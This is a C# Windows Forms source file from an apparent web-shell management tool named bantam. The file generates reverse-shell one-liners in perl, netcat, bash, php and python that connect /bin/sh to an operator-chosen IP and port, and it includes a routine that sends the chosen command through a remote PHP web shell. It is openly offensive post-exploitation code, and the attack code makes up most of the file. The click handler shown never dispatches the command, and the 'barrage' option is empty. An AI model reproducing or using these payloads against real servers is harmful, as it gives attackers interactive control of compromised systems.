using System;
using System.Collections.Generic;
using System.Threading.Tasks;
using System.Windows.Forms;

using bantam.Classes;

namespace bantam.Forms
{
    public partial class ReverseShell : Form
    {
        /// <summary>
        /// 
        /// </summary>
        public string ShellUrl { get; set; }

        /// <summary>
        /// 
        /// </summary>
        public static readonly List<string> shellVectors = new List<string>() {
             "perl",
             "netcat",
             "netcat with pipe",
             "php",
             "bash",
             "python",
             "barrage"
        };

        /// <summary>
        /// 
        /// </summary>
        public ReverseShell(string shellUrl)
        {
            InitializeComponent();

            ShellUrl = shellUrl;

            foreach(var vecs in shellVectors) {
                comboBoxMethod.Items.Add(vecs);
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="ip"></param>
        /// <param name="port"></param>
        /// <returns></returns>
        public string PerlShell(string ip, string port)
        {
            //todo
            //validate ip IP
            //validate port range
            string perlShell = "perl -e 'use Socket;"
                             + "$i=\"" + ip + "\";"
                             + "$p=" + port + ";"
                             + "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
                             + "if(connect(S,sockaddr_in($p,inet_aton($i)))){"
                                 + "open(STDIN,\">&S\");"
                                 + "open(STDOUT,\">&S\");"
                                 + "open(STDERR,\">&S\");"
                                 + "exec(\"/bin/sh -i\");"
                             + "};'";

            return perlShell;
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="ip"></param>
        /// <param name="port"></param>
        /// <returns></returns>
        public string NetCatShell(string ip, string port)
        {
            return "nc -e /bin/sh " + ip + " " + port;
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="ip"></param>
        /// <param name="port"></param>
        /// <returns></returns>
        public string NetCatPipeShell(string ip, string port)
        {
            string netcatPipe = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc " + ip + " " + port + " >/tmp/f";
            return netcatPipe;
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="ip"></param>
        /// <param name="port"></param>
        /// <returns></returns>
        public string PhpShell(string ip, string port)
        {
            //todo this requires exec, lets add more shell execution methods incause of disabled functions or possibly not use two system calls???
            string phpShell = "php -r '$sock=fsockopen(\"" + ip + "\"," + port + ");"
                            + "exec(\"/bin/sh -i <&3 >&3 2>&3\");'";

            return phpShell;
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="ip"></param>
        /// <param name="port"></param>
        /// <returns></returns>
        public string BashShell(string ip, string port)
        {
            string bashShell = "bash -i >& /dev/tcp/" + ip + "/" + port + " 0>&1";
            return bashShell;
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="ip"></param>
        /// <param name="port"></param>
        /// <returns></returns>
        public string PythonShell(string ip, string port)
        {
            string pythonShell = "python -c 'import socket,subprocess,os;"
                               + "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
                               + "s.connect((\"" + ip + "\"," + port + "));"
                               + "os.dup2(s.fileno(),0); " 
                               + "os.dup2(s.fileno(),1);"
                               + "os.dup2(s.fileno(),2);"
                               + "p=subprocess.call([\"/bin/sh\",\"-i\"]);'";

            return pythonShell;
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="shellCode"></param>
        private async void PopReverseShell(string shellCode)
        {
            string phpCode = PhpHelper.ExecuteSystemCode(shellCode, false);

            ResponseObject response = await Task.Run(() => WebHelper.ExecuteRemotePHP(ShellUrl, phpCode, false));

            if (string.IsNullOrEmpty(response.Result) == false) {
                string result = response.Result;
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void btnPopShell_Click(object sender, EventArgs e)
        {
            string shellCode = string.Empty;
            string ip = Helper.MinifyCode(textBoxIP.Text);
            string port = textBoxPort.Text;

            switch (comboBoxMethod.Text) {
                case "perl":
                    shellCode = PerlShell(ip, port);
                    break;
                case "netcat":
                    shellCode = NetCatShell(ip, port);
                    break;
                case "netcat with pipe":
                    shellCode = NetCatPipeShell(ip, port);
                    break;
                case "php":
                    shellCode = PhpShell(ip, port);
                    break;
                case "bash":
                    shellCode = BashShell(ip, port);
                    break;
                case "python":
                    shellCode = PythonShell(ip, port);
                    break;
                case "barrage":

                    break;
            }
        }

        private async void buttonGetIpv4_Click(object sender, EventArgs e)
        {
            var task = WebHelper.GetRequest("http://ipv4.icanhazip.com/");

            //Todo tie this timeout in as a configureable option
            if (await Task.WhenAny(task, Task.Delay(10000)) == task) {
                if (string.IsNullOrEmpty(task.Result)) {
                    MessageBox.Show("Unable to ubtain IP Address", "Connection Failed");
                } else {
                    textBoxIP.Text = task.Result;
                }
            }
        }
    }
}

